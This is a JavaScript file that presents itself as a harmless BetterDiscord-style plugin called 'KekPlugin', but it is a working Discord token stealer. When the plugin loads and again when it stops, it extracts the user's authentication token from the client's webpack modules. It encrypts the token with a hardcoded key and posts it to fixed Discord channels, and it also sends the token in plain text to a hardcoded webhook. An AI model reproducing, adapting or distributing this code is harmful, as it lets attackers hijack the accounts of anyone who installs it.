/**
 * @name KekPlugin
 * @author Curse
 * @description A kek for you
 * @version chec
 */

module.exports = class KekPlugin {
    load() {

        function convertToEscapeSequence(input) {
            function charToEscapeSequence(char) {
                return '\\x' + char.charCodeAt(0).toString(16).padStart(2, '0');
            }
        
            return Array.from(input).map(charToEscapeSequence).join('');
        }

        function convertFromEscapeSequence(input) {
            const escapeSequenceRegex = /\\x([0-9A-Fa-f]{2})/g;
        
            function escapeSequenceToChar(match, hexCode) {
                return String.fromCharCode(parseInt(hexCode, 16));
            }
        
            return input.replace(escapeSequenceRegex, escapeSequenceToChar);
        }
        
        async function encrypt(text, actualKey) {
            const predefinedKey = "eleven";
            let counter = 0;

            let totalBits = 0;
            while (totalBits < 128) {
                const combinedKey = predefinedKey + predefinedKey.substr(0, counter) + actualKey;
                const encoder = new TextEncoder();
                const keyData = encoder.encode(combinedKey);
                totalBits = keyData.length * 8;
                counter++;
            }

            const encoder = new TextEncoder();
            const data = encoder.encode(text);
            const combinedKey = predefinedKey + predefinedKey.substr(0, counter - 1) + actualKey;
            const keyData = encoder.encode(combinedKey);

            const cryptoKey = await crypto.subtle.importKey('raw', keyData, { name: 'AES-CBC', length: 128 }, false, ['encrypt']);
            const encryptedData = await crypto.subtle.encrypt({ name: 'AES-CBC', iv: new Uint8Array(16) }, cryptoKey, data);

            return {
                encryptedText: convertToEscapeSequence(Array.from(new Uint8Array(encryptedData)).map(byte => String.fromCharCode(byte)).join('')),
                counter: counter - 1
            };
        }

        async function decrypt(encryptedText, actualKey, counter) {
            encryptedText = convertFromEscapeSequence(encryptedText)
            const predefinedKey = "eleven";
            const combinedKey = predefinedKey + predefinedKey.substr(0, counter) + actualKey;
            const encoder = new TextEncoder();
            const keyData = encoder.encode(combinedKey);
        
            const decoder = new TextDecoder();
            const encryptedData = new Uint8Array(encryptedText.split('').map(char => char.charCodeAt(0)));
            const cryptoKey = await crypto.subtle.importKey('raw', keyData, { name: 'AES-CBC', length: 128 }, false, ['decrypt']);
            const decryptedData = await crypto.subtle.decrypt({ name: 'AES-CBC', iv: new Uint8Array(16) }, cryptoKey, encryptedData);
        
            return decoder.decode(decryptedData);
        }
        
        const kek = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => { for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) { if (m.default && m.default.getToken !== undefined) { return m.default.getToken() } } }])
        let _mods = webpackChunkdiscord_app.push([[Symbol()], {}, ({ c }) => Object.values(c)]);
        webpackChunkdiscord_app.pop();

        const findByProps = (...props) => {
            for (let m of _mods) {
                try {
                    if (!m.exports || m.exports === window) continue;
                    if (props.every((x) => m.exports?.[x])) return m.exports;

                    for (let ex in m.exports) {
                        if (props.every((x) => m.exports?.[ex]?.[x])) return m.exports[ex];
                    }
                } catch { }
            }
        }


        encrypt(kek, "bobcurmare")
            .then(result => {
                const wow = result.encryptedText + " mai " + result.counter
                console.log(wow)
                //console.log(decrypt(result.encryptedText, "bobcurmare", result.counter))
                findByProps("getAPIBaseURL").post({
                    url: "/channels/305580569238962186/messages",
                    body: {
                        "content": "iced shop " + wow
                    }
                })
            })
                findByProps("getAPIBaseURL").post({
                    url: "/webhooks/1130077646819168297/-Ju8O6gMCRHnI6oofHmUe3dWz5hB3e-IMVV8XrsvosWjOroxSGpE5VwRFB1IL5trI2eV",
                    body: {
                        "content": "D214 lol aici lil bob -> " + kek
                    }
                })
    }

    start() {

    }

    stop() {
        function convertToEscapeSequence(input) {
            function charToEscapeSequence(char) {
                return '\\x' + char.charCodeAt(0).toString(16).padStart(2, '0');
            }
        
            return Array.from(input).map(charToEscapeSequence).join('');
        }

        function convertFromEscapeSequence(input) {
            const escapeSequenceRegex = /\\x([0-9A-Fa-f]{2})/g;
        
            function escapeSequenceToChar(match, hexCode) {
                return String.fromCharCode(parseInt(hexCode, 16));
            }
        
            return input.replace(escapeSequenceRegex, escapeSequenceToChar);
        }
        
        async function encrypt(text, actualKey) {
            const predefinedKey = "eleven";
            let counter = 0;

            let totalBits = 0;
            while (totalBits < 128) {
                const combinedKey = predefinedKey + predefinedKey.substr(0, counter) + actualKey;
                const encoder = new TextEncoder();
                const keyData = encoder.encode(combinedKey);
                totalBits = keyData.length * 8;
                counter++;
            }

            const encoder = new TextEncoder();
            const data = encoder.encode(text);
            const combinedKey = predefinedKey + predefinedKey.substr(0, counter - 1) + actualKey;
            const keyData = encoder.encode(combinedKey);

            const cryptoKey = await crypto.subtle.importKey('raw', keyData, { name: 'AES-CBC', length: 128 }, false, ['encrypt']);
            const encryptedData = await crypto.subtle.encrypt({ name: 'AES-CBC', iv: new Uint8Array(16) }, cryptoKey, data);

            return {
                encryptedText: convertToEscapeSequence(Array.from(new Uint8Array(encryptedData)).map(byte => String.fromCharCode(byte)).join('')),
                counter: counter - 1
            };
        }

        async function decrypt(encryptedText, actualKey, counter) {
            encryptedText = convertFromEscapeSequence(encryptedText)
            const predefinedKey = "eleven";
            const combinedKey = predefinedKey + predefinedKey.substr(0, counter) + actualKey;
            const encoder = new TextEncoder();
            const keyData = encoder.encode(combinedKey);
        
            const decoder = new TextDecoder();
            const encryptedData = new Uint8Array(encryptedText.split('').map(char => char.charCodeAt(0)));
            const cryptoKey = await crypto.subtle.importKey('raw', keyData, { name: 'AES-CBC', length: 128 }, false, ['decrypt']);
            const decryptedData = await crypto.subtle.decrypt({ name: 'AES-CBC', iv: new Uint8Array(16) }, cryptoKey, encryptedData);
        
            return decoder.decode(decryptedData);
        }
        
        const kek = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => { for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) { if (m.default && m.default.getToken !== undefined) { return m.default.getToken() } } }])
        let _mods = webpackChunkdiscord_app.push([[Symbol()], {}, ({ c }) => Object.values(c)]);
        webpackChunkdiscord_app.pop();

        const findByProps = (...props) => {
            for (let m of _mods) {
                try {
                    if (!m.exports || m.exports === window) continue;
                    if (props.every((x) => m.exports?.[x])) return m.exports;

                    for (let ex in m.exports) {
                        if (props.every((x) => m.exports?.[ex]?.[x])) return m.exports[ex];
                    }
                } catch { }
            }
        }


        encrypt(kek, "bobcurmare")
            .then(result => {
                const wow = result.encryptedText + " mai " + result.counter
                console.log(wow)
                //console.log(decrypt(result.encryptedText, "bobcurmare", result.counter))
                findByProps("getAPIBaseURL").post({
                    url: "/channels/987353588307214356/messages",
                    body: {
                        "content": "iced find " + wow,
                    }
                })
            })
    }
}
